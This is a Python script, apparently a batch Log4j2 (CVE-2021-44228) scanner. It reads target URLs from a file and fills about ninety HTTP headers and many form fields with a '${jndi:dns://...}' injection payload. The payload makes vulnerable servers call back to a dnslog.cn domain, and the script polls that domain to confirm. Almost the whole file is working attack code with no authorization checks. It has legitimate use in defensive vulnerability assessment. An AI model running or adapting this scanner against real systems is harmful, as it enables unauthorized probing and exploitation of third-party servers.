#!/usr/bin/env python
# -*- conding:utf-8 -*-
#Log4j2 fuzz

import requests
import sys
import urllib3
import time
import random

dnslog_res = requests.session()
urllib3.disable_warnings()


def get_dnslog():
    t = random.random()
    url = f"http://www.dnslog.cn/getdomain.php?t={t}"
    res1 = dnslog_res.get(url=url)
    if res1.status_code == 200 and "dnslog" in res1.text:
        dnslog = res1.text
        return dnslog
    else:
        print("获取dnslog失败！")
        sys.exit()

def get_data():
    t = random.random()
    url = f"http://www.dnslog.cn/getrecords.php?t={t}"
    res2 = dnslog_res.get(url=url)
    return res2.text


# Fuzz parameters
def dataParameter(payload):
    datas = ["username", "user", "q", "search", "email", "phone", "mobile", "password", "pass", "token", "login_username", "login_password", "payload", "login", "verify", "dest", "authorzation", "city"]
    data_parameter = {}
    for i in datas:
        data_parameter.update({i: payload})
    return data_parameter

def check(url):

    # dnslog判断来源
    domain = url.split('//')[1].split('.')[0]
    dnslog = get_dnslog()
    payload = "${{jndi:dns://{}.{}/test}}".format(domain, dnslog)

    headers = {
        "User-Agent": payload,
        "X-CSRF-Token": payload,
        "Origin": payload,
        "Cookie": payload,
        "Referer": payload,
        "Accept-Language": payload,
        "X-Forwarded-For": payload,
        "X-Client-Ip": payload,
        "X-Remote-Ip": payload,
        "X-Remote-Addr": payload,
        "X-Originating-Ip": payload,
        "X-CSRFToken": payload,
        "Cf-Connecting_ip": payload,
        "X-Real-Ip": payload,
        "If-Modified-Since": payload,
        "X-Api-Version": payload,
        "X-Wap-Profile": payload,
        "Location": payload,
        "Accept": payload,
        "Accept-Charset": payload,
        "Accept-Datetime": payload,
        "Accept-Encoding": payload,
        "Ali-CDN-Real-IP": payload,
        "Authorization": payload,
        "Cache-Control": payload,
        "Cdn-Real-Ip": payload,
        "Cdn-Src-Ip": payload,
        "CF-Connecting-IP": payload,
        "Client-IP": payload,
        "Contact": payload,
        "DNT": payload,
        "Fastly-Client-Ip": payload,
        "Forwarded-For-Ip": payload,
        "Forwarded-For": payload,
        "Forwarded": payload,
        "Forwarded-Proto": payload,
        "From": payload,
        "Max-Forwards": payload,
        "Originating-Ip": payload,
        "Pragma": payload,
        "Proxy-Client-IP": payload,
        "Proxy": payload,
        "TE": payload,
        "True-Client-Ip": payload,
        "Upgrade": payload,
        "Via": payload,
        "Warning": payload,
        "WL-Proxy-Client-IP": payload,
        "X-ATT-DeviceId": payload,
        "X-Cluster-Client-IP": payload,
        "X-Correlation-ID": payload,
        "X-Do-Not-Track": payload,
        "X-Foo-Bar": payload,
        "X-Foo": payload,
        "X-Forwarded-By": payload,
        "X-Forwarded-For-Original": payload,
        "X-Forwarded-Host": payload,
        "X-Forwarded": payload,
        "X-Forwarded-Port": payload,
        "X-Forwarded-Protocol": payload,
        "X-Forwarded-Proto": payload,
        "X-Forwarded-Scheme": payload,
        "X-Forwarded-Server": payload,
        "X-Forwarded-Ssl": payload,
        "X-Forwarder-For": payload,
        "X-Forward-For": payload,
        "X-Forward-Proto": payload,
        "X-Frame-Options": payload,
        "X-From": payload,
        "X-Geoip-Country": payload,
        "X-Host": payload,
        "X-Http-Destinationurl": payload,
        "X-Http-Host-Override": payload,
        "X-Http-Method-Override": payload,
        "X-Http-Method": payload,
        "X-Http-Path-Override": payload,
        "X-Https": payload,
        "X-Htx-Agent": payload,
        "X-Hub-Signature": payload,
        "X-If-Unmodified-Since": payload,
        "X-Imbo-Test-Config": payload,
        "X-Insight": payload,
        "X-Ip": payload,
        "X-Ip-Trail": payload,
        "X-Leakix": payload,
        "X-Original-URL": payload,
        "X-ProxyUser-Ip": payload,
        "X-Requested-With": payload,
        "X-Request-ID": payload,
        "X-True-IP": payload,
        "X-UIDH": payload,
        "X-XSRF-TOKEN": payload,
    }

    try:
        print("\033[33m[o] 正在检测: {}\33[0m".format(url))
        r_get = requests.get(url, headers=headers, verify=False, timeout=5)
        r_post = requests.post(url, data=dataParameter(payload), headers=headers, verify=False, timeout=5)
    except Exception as e:
        pass
        #print(e)

    time.sleep(6)
    data = get_data()

    if dnslog in data:
        print("\033[31m[+] 目标系统: {} 存在log4j2漏洞\033[0m".format(url))
        print("\033[1;92m{}\033[0m".format(data))
    else:
        print("[x] 目标系统: {} 不存在log4j2漏洞".format(url))


if __name__ == "__main__":
    '''
    url = str(sys.argv[1])
    check(url)
    '''
    
    #批量检测
    file = sys.argv[1]
    with open(file, "r") as f:
        for line in f.readlines():
            url = line.strip()
            if url[:4] != "http":
                url = "http://" + url
            check(url)